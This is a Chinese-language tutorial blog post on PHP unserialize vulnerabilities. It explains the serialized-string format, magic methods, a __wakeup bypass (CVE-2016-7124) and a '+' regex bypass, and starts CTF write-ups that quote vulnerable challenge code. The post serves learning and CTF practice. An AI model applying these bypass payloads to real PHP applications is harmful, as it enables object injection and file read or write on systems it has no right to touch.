<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对用户输入的序列化字符串进行检测，导致攻击者可以<strong>控制反序列化过程</strong>，从而导致RCE，SQL注入，目录遍历等不可控后果。在反序列化的过程中会自动触发某些魔术方法。当反序列化的时候就有可能触发对象中的一些魔术方法。</p>
<blockquote>
<p>序列化一个对象将会保存对象的所有变量，但是<strong>不会保存对象的方法</strong>，只会保存类的名字</p>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&quot;hello,world!&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var3</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var4</span> = <span class="number">0.1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var5</span> = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arg2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//$test-&gt;myfunc($test-&gt;var1, $test-&gt;var2);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span> = serialize(<span class="variable">$test</span>).PHP_EOL;<span class="comment">//PHP_EOL为php换行符，可以提高代码的源代码级可移植性</span></span><br><span class="line">var_dump(<span class="variable">$unser</span> = unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">5</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;var1&quot;</span>;b:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;var2&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;hello,world!&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;var3&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;var4&quot;</span>;d:<span class="number">0.1</span>;s:<span class="number">4</span>:<span class="string">&quot;var5&quot;</span>;N;&#125;</span><br><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (5) &#123;</span></span><br><span class="line"> [<span class="string">&quot;var1&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"> [<span class="string">&quot;var2&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line"> [<span class="string">&quot;var3&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line"> [<span class="string">&quot;var4&quot;</span>]=&gt;</span><br><span class="line"> <span class="keyword">float</span>(<span class="number">0.1</span>)</span><br><span class="line"> [<span class="string">&quot;var5&quot;</span>]=&gt;</span><br><span class="line"> <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果中并没有记录myfunc()方法</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="PHP序列化字符串结构"><a href="#PHP序列化字符串结构" class="headerlink" title="PHP序列化字符串结构"></a>PHP序列化字符串结构</h3><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%93%E6%9E%84.png" alt="PHP序列化字符串结构"></p>
<h3 id="public-protected-private下序列化对象的区别"><a href="#public-protected-private下序列化对象的区别" class="headerlink" title="public    protected    private下序列化对象的区别"></a>public    protected    private下序列化对象的区别</h3><p>测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var1</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$var2</span> = <span class="string">&quot;hello,world!&quot;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var3</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//$test-&gt;myfunc($test-&gt;var1, $test-&gt;var2);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span> = serialize(<span class="variable">$test</span>).PHP_EOL;<span class="comment">//PHP_EOL为php换行符，可以提高代码的源代码级可移植性</span></span><br><span class="line">var_dump(<span class="variable">$unser</span> = unserialize(<span class="variable">$ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%ADpublic%E3%80%81protected%E3%80%81private%E4%B8%8B%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="public、protected、private下序列化对象的区别"></p>
<ul>
<li><p>public变量<br>直接变量名反序列化出来</p>
</li>
<li><p>protected变量<br><code>\00 + * + \00 + 变量名</code><br>可以用<code>S:5:&quot;\00*\00op&quot;</code>来代替<code>s:5:&quot;?*?op&quot;</code>    //此处的<code>?</code>是<code>\00字符</code>，因为不可显示所以用<code>?</code>代替</p>
<p>疑惑：在在线平台测试的时候S和s没什么区别，本地测试必须用S</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$te</span> = <span class="string">&quot;O:5:\&quot;test1\&quot;:1:&#123;s:6:\&quot;\00*\00var\&quot;;s:12:\&quot;hello,world!\&quot;;&#125;&quot;</span>;<span class="comment">//S和s都可以</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$te</span>));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#3 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;test1&quot;</span></span><br><span class="line">  [<span class="string">&quot;var&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>private变量<br><code>\x00 + 类名 + \x00 + 变量名</code></p>
</li>
</ul>
<p>补充：</p>
<p>\x：十六进制</p>
<p>\d：十进制</p>
<p>\o：八进制</p>
<p>\x00不可见字符</p>
<p>php v7.x反序列化的时候对访问类别不敏感</p>
<h3 id="反序列化中S与s的区别"><a href="#反序列化中S与s的区别" class="headerlink" title="反序列化中S与s的区别"></a>反序列化中S与s的区别</h3><p>如果类型是<code>S</code>，会调用以下函数，简单来说就是将<code>\</code>解释成十六进制，来转成字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> zend_string *unserialize_str(<span class="keyword">const</span> unsigned char **p, size_t len, size_t maxlen)</span><br><span class="line">&#123;</span><br><span class="line">	size_t i, j;</span><br><span class="line">	zend_string *str = zend_string_safe_alloc(<span class="number">1</span>, len, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	unsigned char *end = *(unsigned char **)p+maxlen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end &lt; *p) &#123;</span><br><span class="line">		zend_string_efree(str);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (*p &gt;= end) &#123;</span><br><span class="line">			zend_string_efree(str);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (**p != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">			ZSTR_VAL(str)[i] = (char)**p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			unsigned char ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">				(*p)++;</span><br><span class="line">				<span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;a&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (**p &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; **p &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">					ch = (ch &lt;&lt; <span class="number">4</span>) + (**p -<span class="string">&#x27;A&#x27;</span>+<span class="number">10</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					zend_string_efree(str);</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ZSTR_VAL(str)[i] = (char)ch;</span><br><span class="line">		&#125;</span><br><span class="line">		(*p)++;</span><br><span class="line">	&#125;</span><br><span class="line">	ZSTR_VAL(str)[i] = <span class="number">0</span>;</span><br><span class="line">	ZSTR_LEN(str) = i;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><blockquote>
<p>以下内容来自于<a href="https://secure.php.net/manual/zh/language.oop5.magic.php">PHP官方文档中关于魔术方法的部分</a></p>
</blockquote>
<h4 id="构造方法和析构方法"><a href="#构造方法和析构方法" class="headerlink" title="构造方法和析构方法"></a>构造方法和析构方法</h4><ul>
<li>__construct()<br>具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li>
<li>__destruct()<br>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
</ul>
<p><code>new</code>出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()</p>
<h4 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%AD__sleep(),__wakeup().png" alt="__sleep(),__wakeup()"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(<span class="keyword">$this</span>-&gt;server, <span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        mysql_select_db(<span class="keyword">$this</span>-&gt;db, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E4%B8%AD__toString().png" alt="__toString()"></p>
<p><code>echo</code>或者拼接字符串或者其他隐式调用该方法的操作都会触发</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Declare a simple class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$foo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="variable">$foo</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;foo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> TestClass(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//Hello</span></span><br><span class="line"><span class="comment">//注意：在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。</span></span><br></pre></td></tr></table></figure>



<h4 id="set-get-isset-unset"><a href="#set-get-isset-unset" class="headerlink" title="__set()    __get()    __isset()    __unset()"></a>__set()    __get()    __isset()    __unset()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%B1%9E%E6%80%A7%E9%87%8D%E8%BD%BD.png" alt="属性重载"></p>
<h4 id="invoke-call"><a href="#invoke-call" class="headerlink" title="__invoke()    __call()"></a>__invoke()    __call()</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p>
<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>__callStatic(), __set_state(), __clone(), __debugInfo()等和序列化没有多大关系，详情参考官网</p>
<h3 id="反序列化的利用"><a href="#反序列化的利用" class="headerlink" title="反序列化的利用"></a>反序列化的利用</h3><ul>
<li><p>__wakeup失效<br>php版本<code>&lt; 5.6.25 | &lt; 7.0.10</code><br>当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行<br>例：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_19876131/article/details/52890854">__wakeup()函数失效引发漏洞(CVE-2016-7124)</a></p>
</li>
<li><p>使用<code>+</code>绕过正则<br>例：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">preg_match</span>(&#x27;/[oc]:\d+:/i&#x27;, $var)</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br><span class="line"><span class="attribute">O</span>:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/2733">代码审计Day11 - unserialize反序列化漏洞</a></p>
</li>
</ul>
<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="无类执行"><a href="#无类执行" class="headerlink" title="无类执行"></a>无类执行</h4><p>地址：<a href="https://ctf.bugku.com/challenges/detail/id/109.html">点login咋没反应 - Bugku CTF</a></p>
<h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp1.png" alt="PHP无类执行-wp1"></p>
<p>右键查看源码，有个css文件</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp2.png" alt="PHP无类执行-wp2"></p>
<p>点进去访问如下，发现提示<code>?19190</code></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp3.png" alt="PHP无类执行-wp3"></p>
<p>加上<code>?19190</code>访问</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp4.png" alt="PHP无类执行-wp4"></p>
<p>访问结果</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp5.png" alt="PHP无类执行-wp5"></p>
<p>发现php源码，分析代码逻辑，包含了flag.php文件，满足条件才能输出<code>$flag</code></p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp6.png" alt="PHP无类执行-wp6"></p>
<p>抓包构造<code>$cookie</code>值，得到flag</p>
<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp7.png" alt="PHP无类执行-wp7"></p>
<h4 id="有类魔术方法触发"><a href="#有类魔术方法触发" class="headerlink" title="有类魔术方法触发"></a>有类魔术方法触发</h4><p>地址：<a href="https://www.ctfhub.com/#/challenge">CTFHub</a>中的<code>AreUSerialz</code>题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 题目</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h5><p>1.<code>include(&quot;flag.php&quot;)</code>;看出flag应该就在这个文件中</p>
